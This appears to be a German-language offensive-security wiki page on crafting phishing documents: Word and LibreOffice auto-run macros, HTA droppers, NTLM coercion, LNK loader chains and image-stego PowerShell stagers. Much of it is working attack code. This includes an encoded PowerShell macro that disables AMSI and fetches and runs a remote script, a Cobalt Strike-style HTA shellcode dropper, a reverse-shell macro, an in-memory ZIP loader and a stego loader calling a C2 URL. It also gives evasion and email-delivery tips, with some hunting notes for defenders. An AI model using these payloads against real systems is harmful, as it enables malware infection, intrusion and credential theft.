# Phishing-Dateien und -Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung der Dateidaten durch. Die Validierung erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Wenn bei der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei durch Ändern der Dateierweiterung umzubenennen und ihre Fähigkeit zur Makroausführung beizubehalten.\
Beispielsweise unterstützen RTF-Dateien grundsätzlich keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du überprüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine Remote-Vorlage verweisen (Datei –Optionen –Add-Ins –Verwalten: Vorlagen –Gehe zu), die Makros enthält, können ebenfalls Makros „ausführen“.

### Laden externer Bilder

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture und **Dateiname oder URL**:_ http://<ip>/whatever

![Office Documents - Laden externer Bilder: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher werden sie von der AV erkannt.

- AutoOpen()
- Document_Open()

#### Beispiele für Macro-Code
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, wodurch der Dokumentinspektor geöffnet wird. Klicke auf **Überprüfen** und anschließend neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### Doc-Erweiterung

Wähle anschließend das Dropdown-Menü **Dateityp**, und ändere das Format von **`.docx`** zu **Word 97–2003 `.doc`**.\
Der Grund dafür ist, dass du **Makros nicht in einer `.docx` speichern kannst** und die Erweiterung **`.docm` mit aktivierten Makros** einen **schlechten Ruf** **hat** (z. B. enthält das Miniaturbildsymbol ein riesiges `!`, und manche Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist die **veraltete `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige Makros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Auto-Run-Makros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und sie beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Dokument öffnen** gebunden wird (Tools → Anpassen → Ereignisse → Dokument öffnen → Makro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht folgendermaßen aus:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Beachte die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um literale Anführungszeichen zu maskieren. Daher bleiben Payloads, die mit `...==""")` enden, sowohl für den inneren Befehl als auch für das Shell-Argument korrekt ausgeglichen.

Tipps zur Zustellung:

- Als `.odt` speichern und das Makro an das Dokumentereignis binden, damit es sofort beim Öffnen ausgeführt wird.
- Beim Versand per E-Mail mit `swaks` `--attach @resume.odt` verwenden (das `@` ist erforderlich, damit die Dateibytes und nicht der Dateiname als Anhang gesendet werden). Dies ist entscheidend, wenn SMTP-Server missbraucht werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als Anwendung mit „vollständigem Vertrauen“ ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängt**. Wenn IE deinstalliert wurde, können HTAs daher nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Beispielsweise könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder du sendest dem Opfer die **Adresse von Dateien**, die bereits beim **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Prüfe diese und weitere Ideen auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern ein ZIP-Archiv aus, das zwei legitime Täuschungsdokumente (PDF/DOCX) und eine schädliche .lnk-Datei enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader nach einem eindeutigen Marker in den Raw-Bytes des ZIP-Archivs gespeichert ist und die .lnk-Datei ihn vollständig im Speicher extrahiert und ausführt.<sup>[[2]](#references)</sup>

Typischer Ablauf, der vom PowerShell-One-Liner in der .lnk-Datei umgesetzt wird:

1) Das ursprüngliche ZIP-Archiv in gängigen Pfaden suchen: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und nach einem fest codierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist der eingebettete PowerShell-Payload.
3) Das ZIP-Archiv nach %ProgramData% kopieren, dort extrahieren und die Täuschungsdatei .docx öffnen, um einen legitimen Eindruck zu erwecken.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle # entfernen) und im Speicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stufe:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Zustellung missbraucht häufig seriöse PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads nur unter bestimmten Bedingungen ausliefern (z. B. harmlose ZIPs abhängig von IP/UA).
- Die nächste Stage entschlüsselt häufig base64/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Artefakte auf der Festplatte zu minimieren.

Im selben Chain verwendete Persistence
- COM TypeLib Hijacking des Microsoft Web Browser-Steuerelements, sodass IE/Explorer oder jede dieses Steuerelement einbettende Anwendung den Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und sofort verwendbare Befehle finden sich hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die den ASCII-Markierungsstring (z. B. xFIQCV) an die Archivdaten angehängt enthalten.
- .lnk-Dateien, die übergeordnete Benutzer-/Benutzerordner aufzählen, um die ZIP-Datei zu finden, und ein Decoy-Dokument öffnen.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlebige Business-Threads, die mit Links unter vertrauenswürdigen PaaS-Domains enden.

## LNK-Decoy-First-Staging → Scheduled-Task-Persistence → vertrauenswürdiges CPL-Side-Loading

Ein weiteres wiederkehrendes Muster ist eine **ein Dokument imitierende `.lnk`**, die sofort eine harmlose Lockdatei öffnet, während sie im Hintergrund die eigentliche Chain vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **gibt sich als PDF aus** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen obfuskierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass naive Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Decoy-Dokument** herunter, öffnet es für das Opfer und rekonstruiert anschließend im Hintergrund die schädlichen Dateien.
4. Payloads können mit **Dummy-Erweiterungen** geschrieben und anschließend durch Entfernen von Füllzeichen umbenannt werden, wodurch das Auftreten offensichtlicher `.exe`- / `.cpl`-Artefakte verzögert wird.
5. Persistence wird mit einer **minütlich ausgeführten Scheduled Task** eingerichtet, die eine vertrauenswürdige Host-Binärdatei aus einem vom Benutzer beschreibbaren Pfad startet.

Minimale Hunting-Hinweise aus diesem Muster:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ein nützliches Staging-Layout, das man erkennen sollte, ist:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Rapid7-Fallstudie startete die geplante Aufgabe wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben platziert war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei per Side-Loading die Angreifer-CPL anstelle der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Reserviert ausführbaren Speicher und kopiert den entschlüsselten Shellcode
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt sollte separat gesucht werden: Malware vermeidet häufig einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI, die einen Callback entgegennimmt**, um die Ausführung zu übertragen.

Die entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode. Dieser lud dann die finale PE vollständig im Speicher und patchte **AMSI/WLDP/ETW** im aktuellen Prozess, bevor er die Ausführung übergab. Ausführlichere Hinweise zu Side-Loading und speicherresidenter Nachbearbeitung finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Ansatzpunkte für die Suche:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Täuschungsdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen aus unsinnigen Erweiterungen.
- Geplante Aufgaben mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl`- / `.dll`**-Dateien aus demselben Verzeichnis außerhalb des Systems laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom side-geladenen Modul gelesen werden.

## Durch Steganografie abgegrenzte Payloads in Bildern (PowerShell-Stager)

Neuere Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-Stager decodiert und ausführt. Dieser Stager lädt ein Bild herunter, häufig ein GIF, das eine Base64-codierte .NET-DLL als Klartext zwischen eindeutigen Start-/End-Markierungen verbirgt. Das Skript sucht nach diesen Begrenzern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, decodiert ihn per Base64 in Bytes, lädt die Assembly im Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Arbeitsablauf
- Stufe 1: Archivierter JS/VBS-Dropper → decodiert eingebettetes Base64 → startet den PowerShell-Stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-Stager → lädt ein Bild herunter, extrahiert Base64 anhand der Markierungen, lädt die .NET-DLL im Speicher und ruft ihre Methode auf, z. B. VAI, wobei die C2-URL und Optionen übergeben werden.
- Stufe 3: Der Loader ruft die finale Payload ab und injiziert sie typischerweise per Process Hollowing in eine vertrauenswürdige Binärdatei, häufig MSBuild.exe.<sup>[[7]](#references)[[8]](#references)</sup> Weitere Informationen zu Process Hollowing und der Proxy-Ausführung über vertrauenswürdige Hilfsprogramme finden Sie hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Stego-Payload-Extraktor und Loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notizen
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Die Marker unterscheiden sich je nach Kampagne.
- AMSI/ETW bypass und String-Deobfuscation werden häufig vor dem Laden der Assembly angewendet.
- Hunting: Heruntergeladene Bilder auf bekannte Delimiter scannen; PowerShell identifizieren, das auf Bilder zugreift und unmittelbar Base64-Blobs decodiert.

Siehe auch stego tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Eine wiederkehrende Initial-Stage ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv zugestellt wird. Ihr einziger Zweck besteht darin, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stage über HTTPS zu bootstrappen.<sup>[[5]](#references)</sup>

Skeleton-Logik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Junk-Strings lokalisieren
- In ASCII PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, wobei `powershell.exe` aufgerufen wird

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Command Line starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## Windows-Dateien zum Stehlen von NTLM-Hashes

Siehe die Seite über **Orte zum Stehlen von NTLM-Creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice-Makro → IIS-Webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgefeilter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Verfolgung des Dropping-Elephant-Tradecrafts durch eine China-themed Loader-Kette](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistence-Technik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern aus](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
